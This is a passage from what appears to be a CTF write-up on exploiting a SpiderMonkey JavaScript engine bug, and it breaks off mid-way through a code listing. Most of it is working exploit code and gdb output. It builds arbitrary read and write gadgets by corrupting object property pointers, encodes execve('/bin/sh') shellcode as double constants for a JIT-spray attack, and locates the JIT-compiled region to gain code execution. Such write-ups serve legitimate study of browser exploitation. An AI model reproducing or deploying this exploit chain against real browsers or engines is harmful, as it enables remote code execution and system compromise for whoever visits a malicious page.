<li>Assign 0 to <code>d.x</code>, <code>d.y</code>, and <code>d.z</code>. Now, our heap layout for <code>d</code> properties will be like this</li>
</ul>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  x/4gx 0x00001f4107200da0
</span></span><span style="display:flex;"><span>0x1f4107200da0: 0xfff8800000000000      0xfff8800000000000
</span></span><span style="display:flex;"><span>0x1f4107200db0: 0xfff8800000000000      0x00007ffff6951ff2
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Assign the object to <code>d.y</code> (Just test by assigning any object). Now, our heap layout for <code>d</code> properties will be like this</li>
</ul>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  x/4gx 0x00001f4107200da0
</span></span><span style="display:flex;"><span>0x1f4107200da0: 0xfff8800000000000      0xfffe1f4107200f00
</span></span><span style="display:flex;"><span>0x1f4107200db0: 0xfff8800000000000      0x00007ffff6951ff2
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>What we want to retrieve on <code>d.y</code> is only the 6 bytes of its LSB, because that is the address of the object. However, we can&rsquo;t really get it by directly access the <code>d.y</code> value because of the object tag. So, we need to get rid of it</li>
<li>The trick is to shift the current <code>d</code> properties pointer by 6 (So instead of <code>0x00001f4107200da0</code>, overwrite it to <code>0x00001f4107200da0+6</code>). Now, if we get <code>d.x</code> value, the result will be like <code>0x1f4107200f00fff8</code></li>
<li>Now, accessing <code>d.x</code> will return what the stored value inside address in form of Double due to successfully remove the object tag.</li>
<li>To get the real address, convert the retrieved <code>d.x</code> to BigInt first, right shift it by 16 (so that now the retrieved value will be <code>0x1f4107200f00</code>), and then convert it back to Double.</li>
<li>Now, we finally get rid of the tag and get the passed object address in form of Double.</li>
</ul>
<p>Now, let&rsquo;s try to create a write gadget. Below is the code</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Write value (double) to the given address (double)
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> write(dbl_addr, dbl_val) {
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// General logic:
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Overwrite the object d properties pointter to the given address.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Now, d.x will point to the given address.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#09f;font-style:italic">// - Assign d.x value, which mean now the given address contains our given value.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    original <span style="color:#555">=</span> b[<span style="color:#f60">27</span>];
</span></span><span style="display:flex;"><span>    b[<span style="color:#f60">27</span>] <span style="color:#555">=</span> dbl_addr;
</span></span><span style="display:flex;"><span>    d.x <span style="color:#555">=</span> dbl_val;
</span></span><span style="display:flex;"><span>    b[<span style="color:#f60">27</span>] <span style="color:#555">=</span> original;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>The comment of the code is already self-explanatory. Basically we overwrite the <code>d</code> properties pointer with our target address, assign <code>d.x</code> with the targeted value, and after that, our targeted address will be overwritten.</p>
<p>Now, let&rsquo;s try to create another read gadget. But this one will be used to read an address value in form of Double (not to read an address of object, so it slightly different).</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>target_buf <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> Float64Array(<span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>target_buf.fill(<span style="color:#f60">2.4303</span>e<span style="color:#555">-</span><span style="color:#f60">320</span>) <span style="color:#09f;font-style:italic">// Just to set the array element count
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>data_ptr <span style="color:#555">=</span> doubleAddBigInt(addrof(target_buf), <span style="color:#f60">0x30</span>n)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Given an address in Double form, read &amp; return the address stored value as double
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> read(dbl_addr) {
</span></span><span style="display:flex;"><span>    write(data_ptr, dbl_addr)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> target_buf[<span style="color:#f60">0</span>]
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>What we do here is:</p>
<ul>
<li>Create another array</li>
<li>Overwrite the metadata pointer of its element to our targeted address</li>
<li>Now, accessing d[0] will return the targeted address value. Notes that there is some limitation with this, where if the address MSBs is a tag object, we won&rsquo;t be able to read it.</li>
</ul>
<p>I do this after trial-and-error and reading some writeups. During testing, this is the most stable method to read for my payload.</p>
<p>Finally, we already create three gadgets:</p>
<ul>
<li>Read the address of an object</li>
<li>Write any value to any address</li>
<li>Read any address stored value (with some limitation)</li>
</ul>
<p>Now, we will move to our next phase, where we aim to gain RCE.</p>
<h4 id="smuggle-shellcode">Smuggle shellcode <a href="#smuggle-shellcode" class="anchor">#</a></h4>
<p>Let&rsquo;s do JIT Spraying attack now. In order to do this, first we need to craft our shellcode, where its line should be less than 8 bytes. Taken from this <a href="https://ctftime.org/writeup/29915" target="_blank" rel="noopener">writeup</a>, this shellcode will spawn a shell if got executed</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># Shellcode taken from https://ctftime.org/writeup/29915
</span></span><span style="display:flex;"><span>instructions = [
</span></span><span style="display:flex;"><span>&#34;mov ebx, 0x0068732f&#34;,
</span></span><span style="display:flex;"><span>&#34;shl rbx, 32&#34;,
</span></span><span style="display:flex;"><span>&#34;mov edx, 0x6e69622f&#34;,
</span></span><span style="display:flex;"><span>&#34;add rbx, rdx&#34;,
</span></span><span style="display:flex;"><span>&#34;push rbx&#34;,
</span></span><span style="display:flex;"><span>&#34;xor eax, eax&#34;,
</span></span><span style="display:flex;"><span>&#34;mov al, 0x3b&#34;,
</span></span><span style="display:flex;"><span>&#34;mov rdi, rsp&#34;,
</span></span><span style="display:flex;"><span>&#34;xor edx, edx&#34;,
</span></span><span style="display:flex;"><span>&#34;syscall&#34;
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we have our shellcode, let&rsquo;s smuggle this by:</p>
<ul>
<li>Pad each line so that its size will be 8-bytes</li>
<li>Convert the hex bytes to Double (I use python)
<ul>
<li>For example, this shellcode bytes <code>b'\xbb/sh\x00\x90\x90\x90'</code> double representation is <code>-6.827620262216015e-229</code></li>
</ul>
</li>
<li>Now, create a method that consist of this constants. Below is my crafter function.</li>
</ul>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* JIT Spray */</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Some ideas are taken from https://ret2.life/posts/corCTF-2021/#fn:2
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Shellcode are inspired from https://ctftime.org/writeup/29915
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// This will be JITed later. These const will be stored in a r-x region after being JITed.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">function</span> sc() {
</span></span><span style="display:flex;"><span>    sc_marker <span style="color:#555">=</span> <span style="color:#f60">5.40900888</span>e<span style="color:#555">-</span><span style="color:#f60">315</span>;      <span style="color:#09f;font-style:italic">// 0x41414141 in memory. Will be used during searching for the address of our const.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    SC1 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.827620262216015</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC2 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.82852429045179</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC3 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.82831220543336</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC4 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527040799766</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC5 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527034422697</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC6 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527034440643</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC7 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527034390964</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC8 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527042770368</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC9 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527034447392</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>    SC10 <span style="color:#555">=</span> <span style="color:#555">-</span><span style="color:#f60">6.828527034370483</span>e<span style="color:#555">-</span><span style="color:#f60">229</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>If you notice, I smuggle 0x41414141 also into the method. This will be useful later during searching for our JIT-ed function address.</p>
<p>Now that the function is ready, let&rsquo;s force this function to be JIT-ed by IonMonkey. How? Simply run this method so many times like below</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Execute sc 0x1000 to make it got JITed
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">for</span> (i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> <span style="color:#f60">0x1000</span>; i<span style="color:#555">++</span>) sc();
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, we can move to our next step after it got jitted.</p>
<h4 id="find-the-jit-ed-function-and-jump-to-it">Find the JIT-ed function and jump to it <a href="#find-the-jit-ed-function-and-jump-to-it" class="anchor">#</a></h4>
<p>In order to do this, we will need to inspect the <code>sc</code> function metadata. Let&rsquo;s try to get the function address with our <code>addrof</code> method.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Get the function address
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>sc_addr <span style="color:#555">=</span> addrof(sc)
</span></span></code></pre></td></tr></table>
</div>
</div><p>After running that line, we will know get the address of function <code>sc</code>. Now, let&rsquo;s inspect it in gdb.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  vmmap
</span></span><span style="display:flex;"><span>[ Legend:  Code | Heap | Stack ]
</span></span><span style="display:flex;"><span>Start              End                Offset             Perm Path
</span></span><span style="display:flex;"><span>0x001f4107200000 0x001f4107300000 0x00000000000000 rw-
</span></span><span style="display:flex;"><span>0x00291cb41b4000 0x00291cb41c4000 0x00000000000000 ---
</span></span><span style="display:flex;"><span>0x00291cb41c4000 0x00291cb41e1000 0x00000000000000 r-x
</span></span><span style="display:flex;"><span>0x00291cb41e1000 0x00291cb41e4000 0x00000000000000 r-x
</span></span><span style="display:flex;"><span>0x00291cb41e4000 0x00291cb41f4000 0x00000000000000 ---
</span></span><span style="display:flex;"><span>0x00291cb41f4000 0x00291cb41f7000 0x00000000000000 r-x
</span></span><span style="display:flex;"><span>0x00291cb41f7000 0x00291cb4204000 0x00000000000000 r-x
</span></span><span style="display:flex;"><span>gef➤  tele 0x1f41072026c8
</span></span><span style="display:flex;"><span>0x001f41072026c8│+0x0000: 0x003afd8a73c160  →  0x003afd8a73b0a0  →  0x005555585c0700  →  0x00555558657190  →  &#34;Function&#34;
</span></span><span style="display:flex;"><span>0x001f41072026d0│+0x0008: 0x0055555700b9a8  →  &lt;emptyObjectSlotsHeaders+8&gt; add BYTE PTR [rax], al
</span></span><span style="display:flex;"><span>0x001f41072026d8│+0x0010: 0x0055555700b970  →  &lt;emptyElementsHeader+16&gt; add BYTE PTR [rax], al
</span></span><span style="display:flex;"><span>0x001f41072026e0│+0x0018: 0xfff88000000000a0
</span></span><span style="display:flex;"><span>0x001f41072026e8│+0x0020: 0xfffe3afd8a73e038
</span></span><span style="display:flex;"><span>0x001f41072026f0│+0x0028: 0x003afd8a76bf10  →  0x00291cb41d4d50  →  0x7ffff6924500b848
</span></span><span style="display:flex;"><span>0x001f41072026f8│+0x0030: 0xfffb3afd8a7145c0
</span></span><span style="display:flex;"><span>0x001f4107202700│+0x0038: 0x007ffff6951ff1  →  0x0100007ffff69518
</span></span><span style="display:flex;"><span>0x001f4107202708│+0x0040: 0x0000000100000000
</span></span><span style="display:flex;"><span>0x001f4107202710│+0x0048: 0x001f4107200da0  →  0xfff8800000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Inspecting inside the gdb, we notice that at offset <code>0x28</code>, if we follow the stored pointer, it will point to the JIT-ed area (the area where the permission is <code>r-x</code>). <code>0x00291cb41d4d50</code> is in <code>r-x</code> area.</p>
<p>Now, we need to know where is our shellcode stored. How to do this? Well we need to bruteforce a little bit. Based on the address that we got before, let&rsquo;s try to increase the address, and then we check the stored value. Here comes why we need to smuggle <code>0x0041414141</code> in our JIT-ed function. We will use this as an identifier during bruteforce. If the stored value in our increased address is equals to <code>5.40900888e-315</code> (Double representation of <code>0x0041414141</code>), that means we have found our shellcode. Below is the implementation of the bruteforce code.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
